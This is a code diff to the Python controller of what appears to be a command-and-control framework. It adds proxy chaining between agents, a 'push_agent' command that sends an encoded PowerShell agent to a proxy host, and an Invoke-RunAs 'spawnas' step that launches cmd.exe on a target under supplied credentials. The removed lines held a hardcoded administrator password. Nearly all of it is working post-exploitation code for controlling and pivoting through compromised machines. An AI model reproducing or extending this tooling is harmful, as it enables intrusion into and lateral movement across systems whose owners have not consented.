@@ -35,7 +35,14 @@ class Control():
         print gdata.target
     
     # SET COMMAND TO BE SENT TO THE AGENT/TARGET
-    def set_command(self, param, param_target):
+    def set_command(self, param, param_target, proxy_param):
+
+        if proxy_param != "":
+            if param.startswith("get_result"):
+                proxy_param = "get_proxy_result*%s*" % proxy_param
+            else:
+                proxy_param = "set_proxy_task*%s*" % proxy_param
+        
         # IMPORT A POWERSHELL MODULE ON THE TARGET
         if param.startswith("powershell-import"):
             # ENCODE SCRIPT
@@ -217,25 +224,47 @@ class Control():
             _exec = ("%s|%s|%s|%s") % ("usemodule" , utimestamp, encoded, encoded_import)
             gdata.target[param_target]["exec"] = _exec
         
-        # USEMODULE: IMPORT & COMMAND [JOB]
+        # SPAWNAS: IMPORT & COMMAND [JOB] -> IN PROGRESS
         elif param.startswith("spawnas"):
-            '''
-            m_script = param.split(" ")[1]
-            m_command = param.replace("usemodule ","")
-            m_command = m_command.replace(m_script+" ","")
-            '''
             m_script = "modules/core/Invoke-Runas.ps1"
             
             m_command = "\nInvoke-RunAs "
-            m_command += "-username \"%s\" " % ("administrator")
-            m_command += "-password \"%s\" " % ("x.123456")
-            m_command += "-Cmd %s " % ("cmd.exe")
+            m_command += "-User \"%s\" " % ("_user_")
+            m_command += "-Password \"%s\" " % ("_pass_")
+            m_command += "-Domain \"%s\" " % ("_domain_")
+            m_command += "-Binary %s " % ("cmd.exe")
+            m_command += "-LogonType 0x2"
             
             with open(m_script) as f:
                 encoded_import = powershell_encoder(f.read())
             utimestamp = int(time.time())
             encoded = powershell_encoder(m_command)
             _exec = ("%s|%s|%s|%s") % ("usemodule" , utimestamp, encoded, encoded_import)
+            gdata.target[param_target]["exec"] = _exec
+        
+        # PUSH AGENT TO PROXY
+        elif param.startswith("push_agent"):
+            
+            with open('agent/ps_agent.ps1') as f:
+                data = f.read()
+                
+            data = strip_powershell_comments(data)
+            encoded = powershell_encoder(data)
+            
+            utimestamp = int(time.time())
+            _exec = ("%s|%s|%s") % (param, utimestamp, encoded)
+            gdata.target[param_target]["exec"] = _exec
+        
+        elif param.startswith("proxy_link"):
+            gdata.proxy = param.replace("proxy_link ","").replace(" ",":")
+            utimestamp = int(time.time())
+            _exec = ("%s|%s") % (param, utimestamp)
+            gdata.target[param_target]["exec"] = _exec
+        
+        elif param.startswith("link_proxy"):
+            gdata.proxy = param.replace("link_proxy ","").replace(" ",":")
+            utimestamp = int(time.time())
+            _exec = ("%s|%s") % (param, utimestamp)
             gdata.target[param_target]["exec"] = _exec
         
         # EXEC COMMAND ON THE TARGET
@@ -245,8 +274,9 @@ class Control():
             utimestamp = int(time.time())
             _exec = ("%s|%s") % (param, utimestamp)
             gdata.target[param_target]["exec"] = _exec
-            
-        return _exec
+        
+        gdata.target[param_target]["exec"] = proxy_param + gdata.target[param_target]["exec"]
+        return proxy_param + _exec
     
     # PROCESS RESPONSE FROM AGENT/TARGET 
     def get_response(self, content, last_command, uuid):
